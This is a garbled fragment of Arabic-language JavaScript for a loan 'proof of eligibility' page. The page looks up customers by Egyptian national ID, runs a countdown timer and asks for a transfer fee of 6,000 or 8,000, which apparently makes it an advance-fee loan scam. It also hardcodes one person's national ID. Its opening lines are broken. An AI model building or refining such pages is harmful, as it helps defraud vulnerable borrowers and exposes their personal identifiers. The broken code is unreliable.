}

// ===== دالة عرض صفحة إثبات الجدارة العادية =====

            currentSeconds--;
            const mins = Math.floor(currentSeconds / 60);

            timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;

    const transferBtn = document.getElementById('transferBtn');
    if (transferBtn) {

            const proofAmountDisplay = (customer.loan < 100000 ? 6000 : 8000).toLocaleString('ar-EG');
            let msg = `📤 إرسال إثبات الجدارة\n`;
            msg += `العميل: ${customer.name}\n`;
            msg += `الرقم القومي: ${nationalId}\n`;

// ===== البحث الرئيسي =====
function searchCustomer() {
    const nationalId = document.getElementById('nationalId').value.trim();
    if (!nationalId) { alert('الرجاء إدخال الرقم القومي'); return; }
    if (nationalId.length !== 14) { alert('الرقم القومي 14 رقم'); return; }
    document.getElementById('loader').style.display = 'block';
    setTimeout(() => {
        document.getElementById('loader').style.display = 'none';
        const customer = customersDatabase[nationalId];
        if (!customer) {
            document.getElementById('resultSection').innerHTML = '';
            document.getElementById('errorCard').style.display = 'block';
            return;
        }
        currentCustomer = customer;
        currentNationalId = nationalId;
        document.getElementById('errorCard').style.display = 'none';

        // التحقق من حالة العميلة ماجدة
        if (nationalId === "26707092100701" && customer.status === "suspended_with_fine") {
            buildSuspendedWithFinePage(customer, nationalId);
        } else {
            buildProofPage(customer, nationalId, false, 30);
        }
    }, 800);
}

window.searchCustomer = searchCustomer;
document.getElementById('nationalId')?.addEventListener('keypress', e => { if (e.key === 'Enter') searchCustomer(); });
